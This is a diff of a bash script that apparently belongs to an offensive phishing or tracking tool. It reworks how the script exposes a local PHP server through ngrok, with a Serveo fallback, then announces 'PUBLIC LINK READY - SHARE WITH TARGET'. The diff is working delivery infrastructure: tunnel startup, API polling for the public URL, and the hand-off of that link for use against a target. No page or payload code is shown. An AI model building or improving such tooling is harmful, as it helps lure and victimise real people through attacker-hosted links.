@@ -274,7 +274,7 @@ setup_ngrok_auth() {
 # Start ngrok tunnel
 # ============================================================================
 try_ngrok() {
-	printf "\e[1;92m[*] Attempting ngrok tunnel...\e[0m\n"
+	printf "\e[1;92m[*] try_ngrok() called\e[0m\n"
 	
 	# Determine ngrok command
 	local NGROK_CMD=""
@@ -285,7 +285,7 @@ try_ngrok() {
 	elif has_cmd ngrok; then
 		NGROK_CMD="ngrok"
 	else
-		printf "\e[1;93m[!] ngrok not available\e[0m\n"
+		printf "\e[1;93m[!] ngrok not available, returning\e[0m\n"
 		return 1
 	fi
 
@@ -293,7 +293,7 @@ try_ngrok() {
 	
 	# Verify ngrok is executable
 	if ! $NGROK_CMD version > /dev/null 2>&1; then
-		printf "\e[1;31m[!] ngrok not executable or not working\e[0m\n"
+		printf "\e[1;31m[!] ngrok not executable\e[0m\n"
 		return 1
 	fi
 	printf "\e[1;92m[+] ngrok version check: OK\e[0m\n"
@@ -306,85 +306,61 @@ try_ngrok() {
 	
 	# Give ngrok time to start and establish tunnel
 	sleep 4
+	printf "\e[1;92m[+] Initial sleep completed\e[0m\n"
 
 	# Verify ngrok process is still running
 	if ! kill -0 $ngrok_pid 2>/dev/null; then
-		printf "\e[1;31m[!] ngrok process died immediately\e[0m\n"
-		printf "\e[1;93m[DEBUG] ngrok.log output:\e[0m\n"
-		cat ngrok.log || true
+		printf "\e[1;31m[!] ngrok process died\e[0m\n"
+		head -20 ngrok.log || true
 		return 1
 	fi
-	printf "\e[1;92m[✓] ngrok process still alive (PID: $ngrok_pid)\e[0m\n"
+	printf "\e[1;92m[✓] ngrok process alive\e[0m\n"
 
-	# Wait for tunnel and poll API
-	printf "\e[1;92m[+] Checking ngrok API at http://127.0.0.1:4040/api/tunnels\e[0m\n"
+	# Poll API
+	printf "\e[1;92m[+] Polling ngrok API...\e[0m\n"
 	local link=""
 	local attempts=0
-	local max_attempts=60  # 60 seconds
+	local max_attempts=50
 	
 	while [[ -z "$link" && $attempts -lt $max_attempts ]]; do
 		sleep 1
 		attempts=$((attempts+1))
 		
-		printf "\r\e[1;92m[+] Polling attempt $attempts/$max_attempts...\e[0m" 
+		if (( attempts % 10 == 0 )); then
+			printf "\e[1;92m[+] Attempt $attempts/$max_attempts\e[0m\n" 
+		fi
 		
 		# Try curl to ngrok API
 		if has_cmd curl; then
 			local api_response=""
 			api_response=$(curl -s --connect-timeout 1 --max-time 2 http://127.0.0.1:4040/api/tunnels 2>&1 || true)
 			
-			if [[ -n "$api_response" ]]; then
-				printf "\e[0m\n"
-				printf "\e[1;92m[DEBUG] API response (attempt $attempts):\e[0m\n"
-				printf "$api_response" | head -3
-				printf "\e[0m\n"
-				
+			if [[ -n "$api_response" && "$api_response" == *"public_url"* ]]; then
 				link=$(echo "$api_response" | grep -o '"public_url":"https://[^"]*' | head -n1 | cut -d'"' -f4 || true)
-				if [[ -z "$link" ]]; then
-					link=$(echo "$api_response" | grep -o 'https://[^/]*' | head -n1 || true)
-				fi
-				
-				if [[ -n "$link" ]]; then
-					printf "\e[1;92m[✓] Got link from API: $link\e[0m\n"
-				fi
 			fi
 		fi
 		
 		# Fallback: grep ngrok.log
 		if [[ -z "$link" ]] && [[ -f ngrok.log ]]; then
 			link=$(grep -o 'https://[A-Za-z0-9.-]*ngrok[^ ]*' ngrok.log | head -n1 || true)
-			if [[ -n "$link" ]]; then
-				printf "\e[0m\n"
-				printf "\e[1;92m[✓] Got link from ngrok.log: $link\e[0m\n"
-			fi
 		fi
 		
 		# Check if ngrok is still alive
 		if ! kill -0 $ngrok_pid 2>/dev/null; then
-			printf "\e[0m\n"
-			printf "\e[1;31m[!] ngrok process died at attempt $attempts\e[0m\n"
-			printf "\e[1;93m[DEBUG] ngrok.log (full):\e[0m\n"
+			printf "\e[1;31m[!] ngrok died at attempt $attempts\e[0m\n"
 			cat ngrok.log || true
 			return 1
 		fi
 	done
-	
-	printf "\e[0m\n"
 
 	if [[ -n "$link" ]]; then
-		printf "\e[1;92m[✓] ngrok tunnel ready after $attempts attempts\e[0m\n"
+		printf "\e[1;92m[✓] ngrok link obtained: $link\e[0m\n"
 		echo "$link"
 		return 0
 	else
-		printf "\e[1;31m[!] ngrok timeout after $max_attempts seconds\e[0m\n"
-		printf "\e[1;93m[DEBUG] ngrok.log (full output):\e[0m\n"
-		cat ngrok.log || true
-		printf "\n\e[1;93m[DEBUG] Checking if localhost:4040 is reachable:\e[0m\n"
-		if has_cmd curl; then
-			curl -v --connect-timeout 2 --max-time 2 http://127.0.0.1:4040/api/tunnels 2>&1 | head -20 || true
-		fi
+		printf "\e[1;31m[!] ngrok timeout\e[0m\n"
+		tail -20 ngrok.log || true
 		kill $ngrok_pid 2>/dev/null || true
-		sleep 1
 		return 1
 	fi
 }
@@ -519,12 +495,11 @@ main() {
 	printf "\e[1;92m[+] Starting PHP server on $PHP_BIND:3333\e[0m\n"
 	
 	# Start PHP server and capture output
-	php -S ${PHP_BIND}:3333 > php.log 2>&1 &
+	php -S ${PHP_BIND}:3333 > php.log 2>&1 < /dev/null &
 	local php_pid=$!
 	printf "\e[1;92m[+] PHP PID: $php_pid\e[0m\n"
 	
-	# Verify PHP started
-	sleep 2
+	# Quick verify PHP started
 	if ! kill -0 $php_pid 2>/dev/null; then
 		printf "\e[1;31m[!] PHP failed to start\e[0m\n"
 		printf "\e[1;93m[DEBUG] php.log:\e[0m\n"
@@ -532,12 +507,18 @@ main() {
 		stop
 	fi
 	
-	printf "\e[1;92m[✓] PHP server running (PID: $php_pid)\e[0m\n"
+	printf "\e[1;92m[✓] PHP server running\e[0m\n"
 
 	# Try ngrok first, then Serveo
 	printf "\n\e[1;92m[*] Obtaining public link...\e[0m\n"
 	local link=""
-	link=$(try_ngrok) || link=$(try_serveo)
+	printf "\e[1;92m[+] Attempting ngrok tunnel...\e[0m\n"
+	link=$(try_ngrok) 
+	
+	if [[ -z "$link" ]]; then
+		printf "\e[1;92m[+] ngrok failed, attempting Serveo fallback...\e[0m\n"
+		link=$(try_serveo)
+	fi
 
 	if [[ -z "$link" ]]; then
 		printf "\e[1;31m[!] All tunneling methods failed\e[0m\n"
@@ -549,6 +530,7 @@ main() {
 		stop
 	fi
 
+	printf "\e[1;92m[+] Link obtained successfully!\e[0m\n"
 	printf "\n"
 	printf "\e[1;92m╔════════════════════════════════════════════════════════════╗\e[0m\n"
 	printf "\e[1;92m║\e[0m\e[1;77m              PUBLIC LINK READY - SHARE WITH TARGET       \e[0m\e[1;92m║\e[0m\n"
